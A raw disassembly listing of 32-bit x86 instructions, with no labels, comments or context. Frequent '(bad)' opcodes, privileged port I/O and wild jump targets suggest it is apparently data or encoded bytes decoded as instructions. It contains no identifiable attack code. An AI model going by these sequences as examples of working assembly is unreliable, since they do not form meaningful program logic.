  4245f9:	xor    BYTE PTR [edi-0x7c],0x80
  4245fd:	out    dx,al
  4245fe:	push   ds
  4245ff:	push   eax
  424600:	ja     0x4245ca
  424602:	xor    BYTE PTR [edi-0x76],0x80
  424606:	lock mov dl,BYTE PTR [ebx-0x4]
  42460a:	push   ebx
  42460b:	sub    dh,BYTE PTR [edx-0x794dd646]
  424611:	or     al,0xff
  424613:	mov    dl,0x80
  424615:	lock xchg DWORD PTR [ebx-0x4e],esp
  424619:	aad    0x55
  42461b:	xor    BYTE PTR [edi-0x76],0x80
  42461f:	lock mov dl,BYTE PTR [ebx+0x2a]
  424623:	push   ebx
  424624:	cld    
  424625:	mov    dl,0xba
  424627:	sub    DWORD PTR [edx-0x4d00f37a],esi
  42462d:	xor    al,0x87
  424630:	mov    dl,0xbe
  424632:	sub    esp,DWORD PTR [ebx-0x4e]
  424635:	aad    0x1d
  424637:	xor    al,0x87
  42463a:	xor    BYTE PTR [edi+0x21],0x80
  42463e:	int    0x32
  424640:	cmp    cl,BYTE PTR [ebp+0x705c098d]
  424646:	xchg   esi,eax
  424647:	dec    ebp
  424648:	xlat   BYTE PTR ds:[ebx]
  424649:	stc    
  42464a:	dec    ebp
  42464b:	or     ch,bh
  42464d:	les    ebx,FWORD PTR [edi]
  42464f:	xor    BYTE PTR [edi-0x38],0xec
  424653:	ja     0x424644
  424655:	xor    al,0x21
  424658:	adc    BYTE PTR [eax+0x32],0x3a
  42465c:	lea    ecx,[ebp+0xa0c6aed]
  424662:	dec    ebp
  424663:	xlat   BYTE PTR ds:[ebx]
  424664:	stc    
  424665:	dec    ebp
  424666:	xchg   esi,eax
  424667:	out    dx,eax
  424668:	push   eax
  424669:	ja     0x424633
  42466b:	xor    BYTE PTR [edi-0x76],0x80
  42466f:	lock mov dl,BYTE PTR [ebx-0x4]
  424673:	push   ebx
  424674:	sub    dh,BYTE PTR [edx-0x794dd646]
  42467a:	or     al,0xff
  42467c:	mov    dl,0x80
  42467e:	lock enter 0xb263,0x80
  424683:	ja     0x424610
  424685:	xor    al,0x8b
  424688:	xlat   BYTE PTR ds:[ebx]
  424689:	push   cs
  42468a:	push   ebx
  42468b:	cld    
  42468c:	push   ebx
  42468d:	sub    dh,BYTE PTR [edx-0x454df37a]
  424693:	sub    edi,edi
  424695:	mov    dl,0x3a
  424697:	ja     0x42461f
  424699:	les    ebx,FWORD PTR ds:0xfc532a53
  42469f:	mov    dl,0xba
  4246a1:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4246a7:	xor    al,0xc8
  4246aa:	or     DWORD PTR [edx],esp
  4246ac:	mov    dl,0x80
  4246ae:	lock test BYTE PTR [eax-0x12],dl
  4246b2:	and    BYTE PTR [eax-0xf7f7489],al
  4246b8:	mov    edx,DWORD PTR [ebx-0x4]
  4246bb:	push   ebx
  4246bc:	sub    dh,BYTE PTR [edx-0x454df37a]
  4246c2:	sub    edi,edi
  4246c4:	mov    dl,0xec
  4246c6:	add    BYTE PTR [eax-0xf7f7589],0x8a
  4246cd:	push   ebx
  4246ce:	sub    dl,BYTE PTR [ebx-0x4]
  4246d1:	mov    dl,0xba
  4246d3:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4246d9:	xor    al,0x84
  4246dc:	pop    edi
  4246dd:	out    dx,al
  4246de:	and    BYTE PTR [ecx],cl
  4246e0:	dec    edi
  4246e1:	adc    DWORD PTR ds:0x77804d4d,ecx
  4246e7:	xor    al,BYTE PTR [eax-0x4d92cd10]
  4246ed:	xchg   BYTE PTR [ecx],ch
  4246ef:	add    DWORD PTR [ecx],esp
  4246f1:	add    esi,ebp
  4246f3:	lea    ecx,[ebp-0x7f4d0073]
  4246f9:	lock not DWORD PTR [edi-0xa]
  4246fd:	and    al,0x6f
  4246ff:	cmp    BYTE PTR [esi+0x4d4d8afe],bh
  424705:	xor    BYTE PTR [edi-0x76],0x80
  424709:	lock mov dl,BYTE PTR [ebx-0x4]
  42470d:	push   ebx
  42470e:	sub    dh,BYTE PTR [edx-0x454df37a]
  424714:	sub    edi,edi
  424716:	mov    dl,0x5f
  424718:	ja     0x4246a0
  42471a:	xlat   BYTE PTR ds:[ebx]
  42471b:	out    dx,eax
  42471c:	xor    BYTE PTR [edi-0x75],0x80
  424720:	lock mov eax,esp
  424723:	outs   dx,DWORD PTR ds:[esi]
  424724:	xor    BYTE PTR [edi-0x76],0x80
  424728:	lock mov dl,BYTE PTR [ebx+0x2a]
  42472c:	push   ebx
  42472d:	cld    
  42472e:	stos   DWORD PTR es:[edi],eax
  42472f:	mov    dl,0xba
  424731:	sub    DWORD PTR [edx-0x56f37a],esi
  424737:	mov    dl,0xa3
  424739:	jo     0x424736
  42473b:	out    dx,eax
  42473c:	lea    edx,[edi-0x78127880]
  424742:	xor    eax,0xf68a777c
  424747:	and    al,0x6f
  424749:	cmp    BYTE PTR [edi+esi*2-0x7c],bh
  42474d:	cmc    
  42474e:	and    al,0x6f
  424750:	cmp    BYTE PTR [eax+0x77502177],al
  424756:	and    DWORD PTR [ecx+0x77806a80],ebx
  42475c:	mov    al,BYTE PTR [eax+0xde28a97]
  424762:	pusha  
  424763:	and    ah,BYTE PTR [edi+ebp*2]
  424766:	cmp    BYTE PTR [ebx-0x4e],dl
  424769:	test   eax,0xf8b27e53
  42476e:	sub    DWORD PTR [edx-0x400f37a],esi
  424774:	adc    BYTE PTR [edi+0x9f763ef],0xf
  42477b:	loopne 0x4247b7
  42477d:	lea    ecx,[ebp-0x7f108880]
  424783:	xchg   edi,eax
  424784:	out    dx,eax
  424785:	in     al,dx
  424786:	or     ah,BYTE PTR [ebp-0x65]
  424789:	push   eax
  42478a:	xchg   edi,eax
  42478b:	enter  0x777c,0x8b
  42478f:	icebp  
  424790:	and    al,0x6f
  424792:	cmp    BYTE PTR [eax-0x687f7489],al
  424798:	mov    edx,DWORD PTR [ebx+0x7e]
  42479b:	mov    dl,0xf8
  42479d:	sub    DWORD PTR [ebx-0x4e],edx
  4247a0:	mov    dl,0x86
  4247a2:	or     al,0xff
  4247a4:	sti    
  4247a5:	adc    BYTE PTR [edi-0x75187f76],0x53
  4247ac:	mov    dh,0x53
  4247ae:	or     eax,0xb229bcb2
  4247b3:	pop    es
  4247b4:	or     al,0xff
  4247b6:	pushf  
  4247b7:	and    bh,0xc8
  4247ba:	pop    edi
  4247bb:	xchg   ebp,eax
  4247bc:	jl     0x42479b
  4247be:	or     DWORD PTR [edi],ecx
  4247c0:	mov    bl,0x3a
  4247c2:	lea    ecx,[ebp-0x7f376880]
  4247c8:	ja     0x4247b9
  4247ca:	in     al,dx
  4247cb:	jmp    0x9780:0x8d8d8d2e
  4247d2:	out    dx,eax
  4247d3:	and    bh,0xc8
  4247d6:	inc    ebx
  4247d7:	fwait
  4247d8:	push   ebp
  4247d9:	and    bh,0x8a
  4247dc:	xchg   ebx,eax
  4247dd:	and    BYTE PTR [edi+0x53cb538a],0x4
  4247e4:	mov    dl,0x61
  4247e6:	or     al,0xb2
  4247e8:	mov    ah,0x29
  4247ea:	inc    DWORD PTR [esi]
  4247ec:	push   eax
  4247ed:	xchg   edi,eax
  4247ee:	and    DWORD PTR [ebx-0x64],0x9
  4247f2:	jns    0x80cfd532
  4247f8:	xchg   edi,eax
  4247f9:	mov    al,BYTE PTR [eax-0x49ac7519]
  4247ff:	push   ebx
  424800:	or     eax,0xb20c07b2
  424805:	mov    esp,0x509cff29
  42480a:	xchg   edi,eax
  42480b:	xor    bh,BYTE PTR [edi+esi*2+0x21]
  42480f:	repz and al,0x6f
  424812:	cmp    BYTE PTR [eax-0x187f7569],al
  424818:	mov    dl,BYTE PTR [ebx-0x4a]
  42481b:	push   ebx
  42481c:	or     eax,0xb20c07b2
  424821:	mov    esp,0xbe9cff29
  424826:	add    eax,0x808d8d8d
  42482b:	xchg   edi,eax
  42482c:	mov    al,BYTE PTR [eax+0xbed8ad7]
  424832:	or     eax,0x2b2b653
  424837:	sub    DWORD PTR [edx+0x7eff0c07],esi
  42483d:	add    ebx,edx
  42483f:	mov    esi,DWORD PTR [esi+0x97e6388]
  424845:	in     eax,dx
  424846:	jmp    0x43cfd5d8
  42484b:	ret    0xe501
  42484e:	or     ch,bh
  424850:	push   eax
  424851:	xlat   BYTE PTR ds:[ebx]
  424852:	stc    
  424853:	or     DWORD PTR [ebx+ebx*1-0x5e],ebx
  424857:	clc    
  424858:	dec    ebp
  424859:	or     DWORD PTR [ebp-0x7868af73],ecx
  42485f:	adc    BYTE PTR [edi-0x7f8e1379],0xd7
  424866:	xchg   esp,ebp
  424868:	xor    DWORD PTR [edx+0x2b22907],0x9c2ff0c
  424872:	pop    esp
  424873:	sbb    esi,DWORD PTR [edx+0xba22107]
  424879:	mul    BYTE PTR [edi+ebp*2]
  42487c:	cmp    BYTE PTR [eax-0x29],dl
  42487f:	xchg   DWORD PTR [eax-0x69],edx
  424882:	xchg   BYTE PTR [eax-0x287f7869],al
  424888:	xchg   DWORD PTR [ebx-0x4a],edx
  42488b:	in     eax,dx
  42488c:	or     ecx,DWORD PTR ds:0xb20c07b2
  424892:	add    ch,BYTE PTR [ecx]
  424894:	(bad)  
  424895:	jle    0x424883
  424897:	xchg   edi,eax
  424898:	out    dx,eax
  424899:	push   eax
  42489a:	xchg   edi,eax
  42489b:	xchg   DWORD PTR [eax-0x287fde69],eax
  4248a1:	and    DWORD PTR [ebx-0x4a],edx
  4248a4:	in     eax,dx
  4248a5:	or     ecx,DWORD PTR ds:0xb22902b2
  4248ab:	pop    es
  4248ac:	or     al,0xff
  4248ae:	jle    0x424830
  4248b0:	xlat   BYTE PTR ds:[ebx]
  4248b1:	xchg   BYTE PTR [ebx-0x3e],ah
  4248b4:	xlat   BYTE PTR ds:[ebx]
  4248b5:	rol    BYTE PTR [eax-0x287fde69],0x21
  4248bc:	push   ebx
  4248bd:	mov    dh,0xed
  4248bf:	or     ecx,DWORD PTR ds:0xb22902b2
  4248c5:	pop    es
  4248c6:	or     al,0xff
  4248c8:	jle    0x42484a
  4248ca:	xlat   BYTE PTR ds:[ebx]
  4248cb:	xchg   BYTE PTR [ebx-0x3e],ah
  4248ce:	xlat   BYTE PTR ds:[ebx]
  4248cf:	out    dx,eax
  4248d0:	adc    BYTE PTR [edi-0x7c287f79],0x3a
  4248d7:	aam    0xed
  4248d9:	jl     0x4248e7
  4248db:	dec    ebp
  4248dc:	lock stc 
  4248de:	or     DWORD PTR [edi+0x12],ecx
  4248e1:	dec    ebp
  4248e2:	dec    ebp
  4248e3:	dec    ebp
  4248e4:	cmp    ah,BYTE PTR [edi-0x74687fce]
  4248ea:	adc    bh,0x8b
  4248ed:	push   ebx
  4248ee:	mov    dh,0xed
  4248f0:	or     ecx,DWORD PTR ds:0xb22902b2
  4248f6:	pop    es
  4248f7:	or     al,0xff
  4248f9:	jle    0x42487b
  4248fb:	xlat   BYTE PTR ds:[ebx]
  4248fc:	xor    al,BYTE PTR [eax-0x2a9c3719]
  424902:	pushf  
  424903:	in     eax,0xd3
  424905:	sub    eax,0x808a9780
  42490a:	xlat   BYTE PTR ds:[ebx]
  42490b:	mov    dl,BYTE PTR [ebx-0x4a]
  42490e:	in     eax,dx
  42490f:	or     ecx,DWORD PTR ds:0xb20c07b2
  424915:	add    ch,BYTE PTR [ecx]
  424917:	in     al,dx
  424918:	je     0x424919
  42491a:	jle    0x42489c
  42491c:	popf   
  42491d:	out    dx,al
  42491e:	arpl   WORD PTR [ebx],ax
  424920:	or     DWORD PTR [edi-0x12],ecx
  424923:	dec    ebp
  424924:	dec    ebp
  424925:	dec    ebp
  424926:	mov    ds:0x53847780,eax
  42492b:	mov    dl,0x80
  42492d:	lock test ch,ch
  424930:	add    eax,0xa6c4ab0d
  424935:	xor    BYTE PTR [edi-0x76],0x53
  424939:	mov    dl,0x80
  42493b:	lock mov dl,BYTE PTR [ebx+0x51]
  42493f:	mov    dl,0xba
  424941:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424947:	test   eax,0x8deffb70
  42494c:	xchg   edi,eax
  42494d:	add    BYTE PTR [edi-0x7285785e],0x8d
  424954:	lea    edi,[edi+esi*2-0x76]
  424958:	mul    BYTE PTR [edi+ebp*2]
  42495b:	cmp    BYTE PTR [edi+esi*2-0x75],bh
  42495f:	cmc    
  424960:	and    al,0x6f
  424962:	cmp    BYTE PTR [eax-0xf7f7589],al
  424968:	mov    bl,BYTE PTR [ecx-0x5f21d65]
  42496e:	and    ah,BYTE PTR [edi+ebp*2]
  424971:	cmp    BYTE PTR [ebx-0x4],dl
  424974:	mov    dl,0x86
  424976:	or     al,0xae
  424978:	push   ebx
  424979:	(bad)  
  42497a:	mov    dl,0xba
  42497c:	sub    edi,edi
  42497e:	mov    dl,0x50
  424980:	ja     0x424906
  424982:	xor    BYTE PTR [edi-0x76],0x80
  424986:	lock mov dl,BYTE PTR [ebx-0x4]
  42498a:	mov    dl,0x86
  42498c:	or     al,0x53
  42498e:	(bad)  
  42498f:	mov    dl,0xba
  424991:	sub    edi,edi
  424993:	mov    dl,0x50
  424995:	ja     0x42498e
  424997:	and    bh,0x25
  42499a:	xor    BYTE PTR [edi-0x79],0x80
  42499e:	lock xchg DWORD PTR [ebx-0x4e],edx
  4249a2:	push   eax
  4249a3:	ja     0x42492c
  4249a5:	mov    ds:0xa3f68777,al
  4249aa:	outs   dx,DWORD PTR ds:[esi]
  4249ab:	cmp    BYTE PTR [eax-0xf7f3789],al
  4249b1:	enter  0xb253,0x50
  4249b5:	ja     0x42497f
  4249b7:	mov    ds:0xe9f6c877,al
  4249bc:	outs   dx,DWORD PTR ds:[esi]
  4249bd:	cmp    BYTE PTR [eax-0xf7fcd89],al
  4249c3:	xor    dl,BYTE PTR [ebx-0x4e]
  4249c6:	push   eax
  4249c7:	ja     0x4249fb
  4249c9:	mov    ds:0x24fa3277,al
  4249ce:	outs   dx,DWORD PTR ds:[esi]
  4249cf:	cmp    BYTE PTR [eax-0xf7f0689],al
  4249d5:	stc    
  4249d6:	push   ebx
  4249d7:	mov    dl,0x50
  4249d9:	ja     0x4249d4
  4249db:	mov    ds:0x24f6f977,al
  4249e0:	out    dx,al
  4249e1:	cmp    BYTE PTR [edi+esi*2+0x25],bh
  4249e5:	jmp    0x807ad6ac
  4249ea:	ja     0x4249db
  4249ec:	dec    edi
  4249ed:	push   0x9
  4249ef:	movd   mm5,DWORD PTR [edi]
  4249f2:	lea    ecx,[ebp+0x4f217780]
  4249f8:	push   0x9
  4249fa:	(bad)  
  4249fc:	das    
  4249fd:	lea    ecx,[ebp+0x4f1d7780]
  424a03:	push   0x9
  424a05:	mov    db5,edi
  424a08:	lea    ecx,[ebp-0x7fda8880]
  424a0e:	ja     0x424a35
  424a10:	xor    al,0xef
  424a13:	mov    dl,0x86
  424a15:	or     al,0x57
  424a17:	(bad)  
  424a18:	hlt    
  424a19:	lea    ecx,[ebp+0x93a5fb9]
  424a1f:	dec    edi
  424a20:	cmp    ch,BYTE PTR [edi]
  424a22:	lea    ecx,[ebp-0x7f758880]
  424a28:	lock mov dl,BYTE PTR [ebx-0x4]
  424a2c:	mov    dl,0x86
  424a2e:	or     al,0x53
  424a30:	(bad)  
  424a31:	mov    dl,0xba
  424a33:	sub    edi,edi
  424a35:	mov    dl,0x50
  424a37:	ja     0x424a30
  424a39:	xor    BYTE PTR [edi-0x76],0x80
  424a3d:	ja     0x4249c9
  424a3f:	xor    BYTE PTR [edi-0x11],0x80
  424a43:	lock out dx,eax
  424a45:	in     al,dx
  424a46:	jge    0x424aad
  424a48:	adc    BYTE PTR [edx+0x25f0500a],0x4f
  424a4f:	push   0x9
  424a51:	cvtpi2ps xmm5,mm6
  424a54:	lea    ecx,[ebp-0x9858884]
  424a5a:	and    al,0x79
  424a5c:	cmp    BYTE PTR [eax-0x7f6c8589],al
  424a62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a63:	jp     0x424ab8
  424a65:	cld    
  424a66:	push   ebx
  424a67:	add    esi,DWORD PTR [edx-0x4b4df37a]
  424a6d:	sub    edi,edi
  424a6f:	adc    BYTE PTR [eax-0x59],0x7a
  424a73:	xor    BYTE PTR [edi-0x76],0x80
  424a77:	ja     0x424a03
  424a79:	or     dh,0x2e
  424a7c:	cmp    cl,BYTE PTR [ebp-0x7f8e7f73]
  424a82:	stos   BYTE PTR es:[edi],al
  424a83:	gs in  al,dx
  424a85:	jno    0x424a07
  424a87:	ja     0x424a13
  424a89:	xor    BYTE PTR [edi-0x76],0x80
  424a8d:	into   
  424a8e:	cmp    cl,BYTE PTR es:[ebp+0x501d808d]
  424a95:	xchg   edi,eax
  424a96:	and    DWORD PTR [ebx-0x5c],esp
  424a99:	xlat   BYTE PTR ds:[ebx]
  424a9a:	imul   eax,DWORD PTR [eax-0x317f3710],0x32
  424aa1:	cmp    cl,BYTE PTR [ebp-0x7b68fe73]
  424aa7:	stos   BYTE PTR es:[edi],al
  424aa8:	adc    BYTE PTR [edi-0x12aeac38],0xc2
  424aaf:	or     eax,0xb20cbeb2
  424ab4:	clc    
  424ab5:	sub    edi,edi
  424ab7:	mov    dh,0x80
  424ab9:	lock and DWORD PTR [edx-0x6cf561b3],ebp
  424ac0:	dec    ebp
  424ac1:	or     ah,BYTE PTR ds:0x8021f080
  424ac7:	xchg   edx,eax
  424ac8:	xchg   ebp,eax
  424ac9:	cmp    BYTE PTR [edi+0xa],0x43
  424acd:	std    
  424ace:	xchg   esi,eax
  424acf:	in     al,dx
  424ad0:	je     0x424adc
  424ad2:	xchg   BYTE PTR [ecx-0x7f727291],ah
  424ad8:	lock and eax,0x3a36ce80
  424ade:	lea    ecx,[ebp-0x61b2e2b0]
  424ae4:	xchg   ebp,eax
  424ae5:	dec    ebp
  424ae6:	xlat   BYTE PTR ds:[ebx]
  424ae7:	out    dx,eax
  424ae8:	xchg   ebx,eax
  424ae9:	xchg   BYTE PTR [edi-0x7f727212],ch
  424aef:	xchg   ebx,eax
  424af0:	gs in  al,dx
  424af2:	xchg   esp,eax
  424af3:	or     DWORD PTR [eax+ebx*8+0x15],ebx
  424af7:	add    DWORD PTR [ebp+0x71],esi
  424afa:	sbb    eax,0x801d7750
  424aff:	ja     0x424a8b
  424b01:	xor    al,0x8a
  424b04:	push   ebx
  424b05:	cld    
  424b06:	in     eax,dx
  424b07:	add    eax,0x29bab20d
  424b0c:	mov    dl,0x86
  424b0e:	or     al,0xff
  424b10:	mov    dl,0x9
  424b12:	pop    esp
  424b13:	fisubr DWORD PTR [edi+0x50]
  424b16:	xchg   edi,eax
  424b17:	and    eax,0xf09fd63
  424b1c:	mov    esp,0x808d8d8d
  424b21:	ja     0x424aad
  424b23:	xor    al,0x8a
  424b26:	push   ebx
  424b27:	cld    
  424b28:	in     eax,dx
  424b29:	add    eax,0x29bab20d
  424b2e:	mov    dl,0x86
  424b30:	or     al,0xff
  424b32:	mov    dl,0x50
  424b34:	ja     0x424ab9
  424b36:	xor    BYTE PTR [edi-0x75],0x80
  424b3a:	lock mov ebp,ebp
  424b3d:	add    eax,0xb2fc530d
  424b42:	mov    edx,0xc86b229
  424b47:	push   DWORD PTR [edx+0x6fda5c09]
  424b4d:	inc    ebx
  424b4e:	std    
  424b4f:	pop    edi
  424b50:	lock or DWORD PTR [ecx],0xffffffce
  424b54:	and    cl,BYTE PTR [ebp-0xf7f7273]
  424b5a:	sbb    eax,0x50efb2ed
  424b5f:	lock sbb eax,0xf080ecc4
  424b65:	sbb    eax,0x805dd880
  424b6a:	push   cs
  424b6b:	push   eax
  424b6c:	ja     0x424af0
  424b6e:	jge    0x424bbf
  424b70:	not    ebp
  424b72:	xor    BYTE PTR [ebx-0x9],cl
  424b75:	xor    edi,ebx
  424b77:	in     al,dx
  424b78:	ja     0x424afc
  424b7a:	les    ecx,FWORD PTR [eax+eax*4]
  424b7d:	sti    
  424b7e:	or     al,BYTE PTR [eax+0x74ecee92]
  424b84:	or     al,BYTE PTR [esi-0x7272d05d]
  424b8a:	xor    BYTE PTR [edi+0x1d],0x80
  424b8e:	jge    0x424b7f
  424b90:	push   eax
  424b91:	lock add BYTE PTR [eax-0x687f7510],0x8a
  424b99:	push   ebx
  424b9a:	push   ecx
  424b9b:	in     eax,dx
  424b9c:	ret    0xb20d
  424b9f:	mov    esi,0x29f8b20c
  424ba4:	(bad)  
  424ba5:	(bad)  
  424ba6:	pop    edi
  424ba7:	lock adc ch,0x1d
  424bab:	xor    al,0xef
  424bae:	in     al,dx
  424baf:	jge    0x424bd2
  424bb1:	dec    ebp
  424bb2:	xlat   BYTE PTR ds:[ebx]
  424bb3:	add    BYTE PTR [eax-0x13691193],0x74
  424bba:	or     al,BYTE PTR [esi-0x7272137b]
  424bc0:	xor    BYTE PTR [edi+0x1d],0x80
  424bc4:	lock mov eax,DWORD PTR [eax+0x51538b97]
  424bcb:	mov    dl,0xbe
  424bcd:	or     al,0xed
  424bcf:	ret    0xed0d
  424bd2:	push   0x3d
  424bd4:	mov    dl,0xf8
  424bd6:	sub    edi,edi
  424bd8:	(bad)  
  424bd9:	cmp    dh,al
  424bdb:	add    DWORD PTR [eax+0x77502597],0x1d
  424be2:	xor    BYTE PTR [edi-0x75],0x80
  424be6:	lock mov ebp,ebp
  424be9:	add    eax,0xb2fc530d
  424bee:	mov    edx,0xc86b229
  424bf3:	push   DWORD PTR [edx+0x925f080]
  424bf9:	pop    esp
  424bfa:	jg     0x424c6b
  424bfc:	inc    ebx
  424bfd:	std    
  424bfe:	pop    edi
  424bff:	lock or DWORD PTR [ecx],0x4c
  424c03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c04:	dec    ebp
  424c05:	dec    ebp
  424c06:	dec    ebp
  424c07:	or     dh,0x26
  424c0a:	cmp    cl,BYTE PTR [ebp-0x28e29c73]
  424c10:	push   ebx
  424c11:	xor    al,0x32
  424c14:	or     dh,0x32
  424c17:	cmp    cl,BYTE PTR [ebp-0x7b68fe73]
  424c1d:	stos   BYTE PTR es:[edi],al
  424c1e:	adc    BYTE PTR [edi-0x12aeacce],0xc2
  424c25:	or     eax,0xb20cbeb2
  424c2a:	clc    
  424c2b:	sub    edi,edi
  424c2d:	mov    dh,0x80
  424c2f:	lock and DWORD PTR [edx-0x6c6a61b3],ebp
  424c36:	dec    ebp
  424c37:	or     ah,BYTE PTR ds:0xf096a4f
  424c3d:	pushf  
  424c3e:	or     al,0x8d
  424c40:	lea    eax,[eax-0x317fda69]
  424c46:	cmp    BYTE PTR [edx],0x8d
  424c49:	lea    eax,[eax+0x53fd808d]
  424c4f:	push   ecx
  424c50:	in     eax,dx
  424c51:	xor    cl,BYTE PTR ds:0xb20cbeb2
  424c57:	test   BYTE PTR [ecx],ch
  424c59:	(bad)  
  424c5a:	std    
  424c5b:	or     DWORD PTR [edi],ecx
  424c5d:	jb     0x424c99
  424c5f:	lea    ecx,[ebp-0x7f758880]
  424c65:	lock mov dl,BYTE PTR [ebx-0x4]
  424c69:	in     eax,dx
  424c6a:	add    eax,0xc86b20d
  424c6f:	mov    dl,0xba
  424c71:	sub    edi,edi
  424c73:	mov    dl,0x50
  424c75:	ja     0x424bfd
  424c77:	pop    esi
  424c78:	imul   ebp,ecx,0x7d01386f
  424c7e:	test   BYTE PTR [eax-0x10],dl
  424c81:	pop    esi
  424c82:	push   eax
  424c83:	lock data16 jl 0x424cfe
  424c87:	inc    esi
  424c88:	sbb    ecx,ebp
  424c8a:	outs   dx,DWORD PTR ds:[esi]
  424c8b:	cmp    BYTE PTR [edi+esi*2+0x62],bh
  424c8f:	call   0x507abc7d
  424c94:	ja     0x424cec
  424c96:	jl     0x424d0f
  424c98:	push   0xfffffff6
  424c9a:	and    al,0x6f
  424c9c:	cmp    BYTE PTR [ebx+0x70],dl
  424c9f:	adc    BYTE PTR [ebp+0x7b24601],0xc
  424ca6:	mov    ds:0x8df4c4c2,al
  424cab:	lea    edi,[ecx+0x75f01650]
  424cb1:	dec    ebp
  424cb2:	dec    ebp
  424cb3:	dec    ebp
  424cb4:	xchg   edx,eax
  424cb5:	in     eax,dx
  424cb6:	retf   
  424cb7:	outs   dx,DWORD PTR ds:[esi]
  424cb8:	in     al,0xb8
  424cba:	pusha  
  424cbb:	mov    ecx,0x50386fe9
  424cc0:	dec    edi
  424cc1:	xchg   ebp,eax
  424cc2:	dec    ebp
  424cc3:	dec    ebp
  424cc4:	dec    ebp
  424cc5:	push   eax
  424cc6:	dec    edi
  424cc7:	mov    ebp,0x504d4d4d
  424ccc:	ja     0x424d28
  424cce:	push   eax
  424ccf:	ja     0x424ce7
  424cd1:	add    DWORD PTR [edx+0xa96018a],edx
  424cd7:	push   eax
  424cd8:	ja     0x424d08
  424cda:	push   eax
  424cdb:	ja     0x424d13
  424cdd:	jl     0x424d2e
  424cdf:	or     cl,BYTE PTR [ebp+0x4d]
  424ce2:	dec    ebp
  424ce3:	bnd jmp 0x1928558
  424ce9:	popf   
  424cea:	dec    ebp
  424ceb:	dec    ebp
  424cec:	dec    ebp
  424ced:	push   eax
  424cee:	sbb    BYTE PTR [ebp+0x7c4d4d4d],ah
  424cf4:	dec    edi
  424cf5:	lods   eax,DWORD PTR ds:[esi]
  424cf6:	dec    ebp
  424cf7:	dec    ebp
  424cf8:	dec    ebp
  424cf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424cfa:	jmp    0x4fbe856e
  424cff:	mov    ch,0x4d
  424d01:	dec    ebp
  424d02:	dec    ebp
  424d03:	sbb    ecx,ebp
  424d05:	outs   dx,DWORD PTR ds:[esi]
  424d06:	cmp    BYTE PTR [edi+ecx*2-0x3b],bh
  424d0a:	dec    ebp
  424d0b:	dec    ebp
  424d0c:	dec    ebp
  424d0d:	icebp  
  424d0e:	jmp    0x4fbe8582
  424d13:	push   edx
  424d14:	dec    ebp
  424d15:	dec    ebp
  424d16:	dec    ebp
  424d17:	sbb    ecx,ebp
  424d19:	outs   dx,DWORD PTR ds:[esi]
  424d1a:	cmp    BYTE PTR [edi+ecx*2-0x2b],bh
  424d1e:	dec    ebp
  424d1f:	dec    ebp
  424d20:	dec    ebp
  424d21:	call   0x507abd0f
  424d26:	add    ebp,ebx
  424d28:	dec    ebp
  424d29:	dec    ebp
  424d2a:	dec    ebp
  424d2b:	jl     0x424d7c
  424d2d:	in     eax,0x4d
  424d2f:	dec    ebp
  424d30:	dec    ebp
  424d31:	fucompp 
  424d33:	outs   dx,DWORD PTR ds:[esi]
  424d34:	cmp    BYTE PTR [eax-0x69],dl
  424d37:	int    0x7c
  424d39:	ja     0x424d4a
  424d3b:	nop
  424d3c:	jmp    0xf09285b0
  424d41:	adc    BYTE PTR [edi+esi*2+0x41],bh
  424d45:	cmc    
  424d46:	jmp    0xf09285ba
  424d4b:	push   ds
  424d4c:	jl     0x424dc5
  424d4e:	es (bad) 
  424d50:	jmp    0x77be85c4
  424d55:	mul    BYTE PTR ds:[edi+ebp*2]
  424d59:	cmp    BYTE PTR [ebx+0x6a],dl
  424d5c:	add    BYTE PTR [ecx+0x4f],0xa
  424d60:	dec    ebp
  424d61:	dec    ebp
  424d62:	dec    ebp
  424d63:	mov    dl,0xbe
  424d65:	or     al,0xcd
  424d67:	add    eax,0x2f4110c4
  424d6c:	inc    ebp
  424d6d:	dec    ebp
  424d6e:	dec    ebp
  424d6f:	dec    ebp
  424d70:	ins    DWORD PTR es:[edi],dx
  424d71:	in     eax,dx
  424d72:	mov    ebx,DWORD PTR [ebx]
  424d74:	in     al,0x2
  424d76:	or     dh,0x32
  424d79:	cmp    cl,BYTE PTR [ebp+0x7501018d]
  424d7f:	dec    ebp
  424d80:	dec    ebp
  424d81:	dec    ebp
  424d82:	xchg   esi,eax
  424d83:	dec    ebp
  424d84:	or     ch,dh
  424d86:	sbb    BYTE PTR [edx],0x32
  424d89:	cmp    cl,BYTE PTR [ebp+0x4518018d]
  424d8f:	dec    ebp
  424d90:	dec    ebp
  424d91:	dec    ebp
  424d92:	stos   BYTE PTR es:[edi],al
  424d93:	or     cl,BYTE PTR [ebp-0x6a]
  424d96:	out    dx,eax
  424d97:	push   eax
  424d98:	ja     0x424d97
  424d9a:	add    DWORD PTR [edi-0x7a],esi
  424d9d:	or     al,BYTE PTR [eax-0x72c5d932]
  424da3:	lea    ecx,[ebp-0x7f]
  424da6:	xor    BYTE PTR [edi-0x3],0x4d
  424daa:	test   DWORD PTR [eax-0xf7f7589],0xedfc538a
  424db4:	add    eax,0xc86b20d
  424db9:	mov    dl,0xba
  424dbb:	sub    edi,edi
  424dbd:	mov    dl,0x50
  424dbf:	ja     0x424d70
  424dc1:	xor    al,0x8a
  424dc4:	xor    BYTE PTR [edi-0x76],0x53
  424dc8:	push   ecx
  424dc9:	in     eax,dx
  424dca:	xor    cl,BYTE PTR ds:0xb22984b2
  424dd0:	mov    esi,0x80fdff0c
  424dd5:	ja     0x424d5d
  424dd7:	arpl   WORD PTR [edx+0x775097d5],si
  424ddd:	jbe    0x424da3
  424ddf:	or     DWORD PTR [eax+0x76f0808d],eax
  424de5:	push   eax
  424de6:	ja     0x424d6e
  424de8:	xor    BYTE PTR [edi-0x7a],0x63
  424dec:	mov    dl,0xd5
  424dee:	iret   
  424def:	or     BYTE PTR [edx],0x1d
  424df2:	sbb    BYTE PTR [edx],0x26
  424df5:	cmp    cl,BYTE PTR [ebp-0x28f19c73]
  424dfb:	stc    
  424dfc:	sbb    BYTE PTR [edx],0x26
  424dff:	cmp    cl,BYTE PTR [ebp+0x1d0a808d]
  424e05:	arpl   WORD PTR [esi],cx
  424e07:	xlat   BYTE PTR ds:[ebx]
  424e08:	cmp    eax,DWORD PTR [eax-0x72c5d1e6]
  424e0e:	lea    eax,[eax-0x557fde69]
  424e14:	cmp    eax,0xa500eec
